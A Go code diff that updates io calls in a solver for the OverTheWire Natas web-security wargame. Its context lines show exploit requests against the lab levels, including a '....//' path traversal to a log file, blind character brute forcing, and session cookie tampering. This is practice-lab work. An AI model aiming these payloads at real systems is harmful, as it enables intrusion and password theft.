@@ -5,7 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -26,7 +26,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -39,7 +39,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -52,7 +52,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -65,7 +65,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -79,7 +79,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -93,7 +93,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -107,7 +107,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -120,7 +120,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -134,7 +134,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -148,7 +148,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -161,7 +161,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -198,7 +198,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -213,13 +213,13 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			files := fileRegex.FindAllString(string(body), -1)
 			req, _ := http.NewRequest("GET", "http://natas12.natas.labs.overthewire.org/"+files[len(files)-1], nil)
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				newPass := findPassword(string(body))
 				return newPass
 			}
@@ -235,13 +235,13 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			files := fileRegex.FindAllString(string(body), -1)
 			req, _ := http.NewRequest("GET", "http://natas13.natas.labs.overthewire.org/"+files[len(files)-1], nil)
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				newPass := findPassword(string(body))
 				return newPass
 			}
@@ -256,7 +256,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -283,7 +283,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if strings.Contains(string(body), "exists") {
 					letters.mux.Lock()
 					letters.data = letters.data + letter
@@ -298,7 +298,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if strings.Contains(string(body), "exists") {
 					newPass.mux.Lock()
 					newPass.data = newPass.data + letter
@@ -341,7 +341,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if !strings.Contains(string(body), "August") {
 					letters.mux.Lock()
 					letters.data = letters.data + letter
@@ -355,7 +355,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if !strings.Contains(string(body), "August") {
 					newPass.mux.Lock()
 					newPass.data = newPass.data + letter
@@ -455,7 +455,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if len(body) > 1000 {
 					newPass := findPassword(string(body))
 					returnChan <- newPass
@@ -480,7 +480,7 @@ func Init() {
 			req.SetBasicAuth(username, password)
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				if len(body) > 1050 {
 					newPass := findPassword(string(body))
 					returnChan <- newPass
@@ -506,7 +506,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := client.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -526,7 +526,7 @@ func Init() {
 			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: session})
 			resp, err := http.DefaultClient.Do(req)
 			if err == nil {
-				body, _ := ioutil.ReadAll(resp.Body)
+				body, _ := io.ReadAll(resp.Body)
 				newPass := findPassword(string(body))
 				return newPass
 			}
@@ -540,7 +540,7 @@ func Init() {
 		req, _ := http.NewRequest("GET", "http://natas22.natas.labs.overthewire.org/index.php?revelio=", nil)
 		req.SetBasicAuth(username, password)
 		resp, _ := client.Do(req)
-		body, _ := ioutil.ReadAll(resp.Body)
+		body, _ := io.ReadAll(resp.Body)
 		newPass := findPassword(string(body))
 		return newPass
 	})
@@ -551,7 +551,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -564,7 +564,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -583,7 +583,7 @@ func Init() {
 		req.URL, _ = url.Parse("http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + session + ".log")
 		resp, err = client.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -600,7 +600,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
@@ -618,7 +618,7 @@ func Init() {
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			newPass := findPassword(string(body))
 			return newPass
 		}
